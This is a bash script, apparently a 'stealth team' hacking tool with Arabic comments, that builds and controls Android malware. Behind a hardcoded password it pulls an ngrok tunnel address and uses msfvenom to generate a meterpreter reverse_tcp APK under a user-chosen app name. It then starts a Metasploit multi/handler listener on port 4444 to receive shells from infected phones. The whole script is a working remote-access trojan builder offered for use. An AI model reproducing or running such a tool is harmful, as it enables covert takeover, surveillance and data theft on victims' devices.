#!/bin/bash

# --- XXSZMSX STEALTH TEAM EDITION ---
# NO NAMES - AUTO CONFIG - TEAM ACCESS

R='\033[1;31m'
B='\033[1;34m'
W='\033[1;37m'
G='\033[1;30m'
N='\033[0m'

# --- LOGIN SYSTEM (NO NAME) ---
clear
echo -e "${R}RESTRICTED AREA: AUTHORIZED PERSONNEL ONLY${N}"
echo -en "${W}[?] KEY: ${N}"
read -s password
echo ""

# الباسورد الجديد بدون اسمك
if [[ $password != "topsecret2026" ]]; then 
    echo -e "${R}WRONG KEY. TERMINATING...${N}"
    exit 1
fi

while true; do
clear
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ MODE ]: STEALTH AUTO-BUILDER"
echo -e "  [ ACCESS ]: SHARED TEAM PORT 4444"
echo -e "  -----------------------------------------------------------${N}"

echo -e "${W}[01]${N} ${B}BUILD TEAM APK (AUTO-CONFIG)${N}"
echo -e "${W}[02]${N} ${R}OPEN SHARED CONTROL PANEL${N}"
echo -e "${W}[03]${N} ${G}VIEW LOGS${N}"
echo -e "${W}[00]${N} ${W}EXIT${N}"

echo -en "\n${R}[COMMAND] >> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[*] BUILDING APK WITH AUTO-SETTINGS...${N}"
        # هنا الأداة بتعرف الهوست بتاع نجروك لوحدها لو شغال
        host=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE "[0-9a-z]+\.tcp\.ngrok\.io")
        port=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE "[0-9]{5}")
        
        if [ -z "$host" ]; then
            echo -e "${R}[!] ERROR: Ngrok is not running! Run 'ngrok tcp 4444' first.${N}"
        else
            read -p "ENTER APP NAME: " vname
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R -o "$vname.apk"
            echo "$vname | Host: $host | Port: $port" >> .logs.txt
            echo -e "${B}[+] APK READY WITH GLOBAL SETTINGS!${N}"
        fi
        read -p "Press Enter..."
        ;;
    2)
        echo -e "\n${R}[!] STARTING SHARED LISTENER ON PORT 4444...${N}"
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set EXITONSESSION false; exploit -j -z"
        ;;
    3)
        cat .logs.txt 2>/dev/null || echo "No logs."
        read -p "Press Enter..."
        ;;
    0) exit ;;
esac
done
